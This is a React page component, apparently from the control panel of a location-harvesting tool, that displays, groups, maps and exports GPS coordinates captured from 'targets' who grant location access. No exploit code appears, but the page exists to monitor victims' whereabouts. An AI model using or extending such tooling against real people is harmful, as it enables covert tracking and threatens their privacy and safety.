import { useEffect, useState, useCallback, useMemo } from 'react'
import { api, Location, Session } from '../api/client'
import { exportCSV } from '../utils/export'
import LoadMoreButton from '../components/LoadMoreButton'
import SessionFilter from '../components/SessionFilter'

interface LocationCluster {
  session_id: string
  count: number
  latest_lat: number
  latest_lon: number
  avg_lat: number
  avg_lon: number
  latest_address: string | null
  last_seen: number
  locations: Location[]
}

export default function Locations() {
  const [locations, setLocations] = useState<Location[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [sessions, setSessions] = useState<Session[]>([])
  const [sessionFilter, setSessionFilter] = useState('')
  const [showGrouped, setShowGrouped] = useState(true)
  const [expandedSession, setExpandedSession] = useState<string | null>(null)
  const [page, setPage] = useState(0)
  const [hasMore, setHasMore] = useState(true)
  const LIMIT = 50

  const refresh = useCallback(async () => {
    try {
      setError(null)
      const result = await api.locations(page * LIMIT, LIMIT, sessionFilter)
      setLocations(result.entries)
      setHasMore(result.has_more)
    } catch (e) { setError(e instanceof Error ? e.message : 'Failed to load') }
    finally { setLoading(false) }
  }, [sessionFilter, page])

  useEffect(() => {
    api.sessions().then(setSessions).catch(() => {})
  }, [])

  useEffect(() => {
    refresh()
    if (autoRefresh) {
      const timer = setInterval(refresh, 15000)
      return () => clearInterval(timer)
    }
  }, [refresh, autoRefresh])

  const clusters = useMemo(() => {
    const map = new Map<string, LocationCluster>()
    for (const loc of locations) {
      const existing = map.get(loc.session_id)
      if (existing) {
        existing.count++
        existing.locations.push(loc)
        if (loc.created_at > existing.last_seen) {
          existing.last_seen = loc.created_at
          existing.latest_lat = loc.latitude
          existing.latest_lon = loc.longitude
          existing.latest_address = loc.address
        }
        existing.avg_lat = (existing.avg_lat * (existing.count - 1) + loc.latitude) / existing.count
        existing.avg_lon = (existing.avg_lon * (existing.count - 1) + loc.longitude) / existing.count
      } else {
        map.set(loc.session_id, {
          session_id: loc.session_id,
          count: 1,
          latest_lat: loc.latitude,
          latest_lon: loc.longitude,
          avg_lat: loc.latitude,
          avg_lon: loc.longitude,
          latest_address: loc.address,
          last_seen: loc.created_at,
          locations: [loc]
        })
      }
    }
    return Array.from(map.values()).sort((a, b) => b.last_seen - a.last_seen)
  }, [locations])

  const copy = (text: string) => navigator.clipboard.writeText(text)

  if (loading) return <div className="flex justify-center py-20"><div className="spinner"></div></div>

  if (error) {
    return (
      <div className="space-y-4">
        <div className="empty-state animate-fade-in">
          <div className="icon">⚠️</div>
          <h3>Failed to load locations</h3>
          <p>{error}</p>
          <button onClick={() => { setLoading(true); refresh() }} className="inline-block mt-5 px-4 py-2 nav-link active">⟳ Retry</button>
        </div>
      </div>
    )
  }

  return (
    <div className="space-y-4 stagger">
      <div className="flex items-center justify-between flex-wrap gap-3 animate-fade-in">
        <div>
          <h1 className="text-xl font-bold text-primary">Locations</h1>
          <p className="text-sm text-tertiary mt-0.5">
            {showGrouped
              ? `${clusters.length} sessions · ${locations.length} GPS coordinates`
              : `${locations.length} GPS coordinates`}
          </p>
        </div>
        <div className="flex gap-2">
          {locations.length > 0 && (
            <button onClick={() => exportCSV(locations.map(l => ({
              session_id: l.session_id, latitude: l.latitude, longitude: l.longitude,
              accuracy: l.accuracy, address: l.address,
              date: new Date(l.created_at * 1000).toISOString()
            })), 'locations.csv')} className="select-apple cursor-pointer">📥 CSV</button>
          )}
          <button onClick={() => setShowGrouped(g => !g)}
            className="select-apple cursor-pointer">
            {showGrouped ? '⊞ All' : '⊟ Grouped'}
          </button>
          <SessionFilter sessions={sessions} value={sessionFilter} onChange={v => { setSessionFilter(v); setPage(0) }} />
          <button onClick={() => setAutoRefresh(!autoRefresh)}
            className={`select-apple cursor-pointer ${autoRefresh ? 'accent-bg accent' : ''}`}>
            {autoRefresh ? '● Live' : 'Paused'}
          </button>
          <button onClick={refresh} className="select-apple cursor-pointer">⟳</button>
        </div>
      </div>

      {locations.length === 0 ? (
        <div className="empty-state animate-fade-in">
          <div className="icon">📍</div>
          <h3>No locations captured</h3>
          <p>GPS data appears when targets grant location access</p>
        </div>
      ) : showGrouped ? (
        <div className="space-y-3">
          {clusters.map((c, i) => {
            const spread = Math.sqrt(
              c.locations.reduce((acc, l) => {
                const dlat = l.latitude - c.avg_lat
                const dlon = l.longitude - c.avg_lon
                return acc + dlat * dlat + dlon * dlon
              }, 0) / c.count
            )
            const isExpanded = expandedSession === c.session_id
            return (
              <div key={c.session_id} className="content-card animate-fade-in"
                style={{ animationDelay: `${i * 0.03}s` }}>
                <div className="flex items-start justify-between cursor-pointer"
                  onClick={() => setExpandedSession(isExpanded ? null : c.session_id)}>
                  <div className="flex items-center gap-3 min-w-0">
                    <span className="text-2xl select-none">📍</span>
                    <div className="min-w-0">
                      <div className="text-sm font-semibold text-primary">
                        {c.session_id.substring(0, 16)}
                        <span className="ml-2 text-xs badge accent-bg accent">{c.count} updates</span>
                      </div>
                      <div className="text-xs accent mono mt-0.5">
                        {c.latest_lat.toFixed(6)}, {c.latest_lon.toFixed(6)}
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-2 shrink-0">
                    {spread > 0.001 && (
                      <span className="text-[10px] text-tertiary bg-tertiary px-1.5 py-0.5 rounded">
                        σ{spread.toFixed(3)}° spread
                      </span>
                    )}
                    <span className="text-xs text-tertiary">{isExpanded ? '▲' : '▼'}</span>
                  </div>
                </div>
                {c.latest_address && (
                  <div className="text-xs text-secondary mt-1 ml-10 leading-relaxed line-clamp-1">
                    {c.latest_address}
                  </div>
                )}
                <div className="flex gap-2 mt-3 ml-10">
                  <a href={`https://www.google.com/maps/place/${c.latest_lat},${c.latest_lon}`}
                    target="_blank" rel="noreferrer"
                    className="text-xs accent-bg accent radius-card px-3 py-1.5 transition-colors hover:bg-accent">
                    🗺 Latest on Maps
                  </a>
                  <button onClick={(e) => { e.stopPropagation(); copy(`${c.latest_lat}, ${c.latest_lon}`) }}
                    className="text-xs bg-tertiary text-secondary radius-card px-3 py-1.5 transition-colors hover:text-primary">
                    📋 Copy Latest
                  </button>
                </div>
                <div className="text-xs text-tertiary mt-2 ml-10">
                  {new Date(c.last_seen * 1000).toLocaleString()}
                </div>

                {isExpanded && (
                  <div className="mt-3 pt-3 border-t border-subtle ml-10 space-y-2">
                    {c.locations.sort((a, b) => b.created_at - a.created_at).map((l, j) => {
                      const accLabel = (l.accuracy ?? 999) < 10 ? 'High' : (l.accuracy ?? 999) < 50 ? 'Medium' : 'Low'
                      const accColor = (l.accuracy ?? 999) < 10 ? '#34c759' : (l.accuracy ?? 999) < 50 ? '#ff9f0a' : '#ff453a'
                      return (
                        <div key={l.id} className="flex items-center gap-3 text-xs py-1.5 border-b border-subtle last:border-0">
                          <span className="accent mono w-44 shrink-0">
                            {l.latitude.toFixed(6)}, {l.longitude.toFixed(6)}
                          </span>
                          <span className="text-tertiary w-16 shrink-0" style={{ color: accColor }}>
                            {accLabel} ({l.accuracy ?? '?'}m)
                          </span>
                          <span className="text-tertiary flex-1 truncate">{l.address || ''}</span>
                          <span className="text-tertiary shrink-0">{new Date(l.created_at * 1000).toLocaleTimeString()}</span>
                          <button onClick={(e) => { e.stopPropagation(); copy(`${l.latitude}, ${l.longitude}`) }}
                            className="text-tertiary hover:text-primary shrink-0">📋</button>
                        </div>
                      )
                    })}
                  </div>
                )}
              </div>
            )
          })}
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {locations.map((l, i) => {
            const acc = l.accuracy ?? 999
            const accLabel = acc < 10 ? 'High' : acc < 50 ? 'Medium' : 'Low'
            const accColor = acc < 10 ? '#34c759' : acc < 50 ? '#ff9f0a' : '#ff453a'
            return (
              <div key={l.id} className="stat-card animate-scale-in"
                style={{ animationDelay: `${i * 0.04}s`, animationFillMode: 'both' }}>
                <div className="flex items-start justify-between">
                  <div className="text-2xl select-none">📍</div>
                  <span className="badge" style={{ backgroundColor: `${accColor}15`, color: accColor }}>{accLabel}</span>
                </div>
                <div className="text-xs text-tertiary mt-1 mono truncate">{l.session_id.substring(0, 16)}</div>
                <div className="text-sm accent mono cursor-pointer mt-1 hover:underline" onClick={() => copy(`${l.latitude}, ${l.longitude}`)}>
                  {l.latitude.toFixed(6)}, {l.longitude.toFixed(6)}
                </div>
                {l.address && (
                  <div className="text-xs text-secondary mt-1 leading-relaxed line-clamp-2">{l.address}</div>
                )}
                <div className="text-xs mt-1" style={{ color: accColor }}>Accuracy: {acc}m</div>
                <div className="flex gap-2 mt-4">
                  <a href={l.maps_url} target="_blank" rel="noreferrer"
                    className="flex-1 text-center text-xs accent-bg accent radius-card py-2 transition-colors hover:bg-accent">
                    🗺 Maps
                  </a>
                  <button onClick={() => copy(`${l.latitude}, ${l.longitude}`)}
                    className="flex-1 text-center text-xs bg-tertiary text-secondary radius-card py-2 transition-colors hover:text-primary">
                    📋 Copy
                  </button>
                </div>
                <div className="text-xs text-tertiary mt-3">{new Date(l.created_at * 1000).toLocaleString()}</div>
              </div>
            )
          })}
        </div>
      )}

      <LoadMoreButton hasMore={hasMore} loading={false} onLoad={() => setPage(p => p + 1)} />
    </div>
  )
}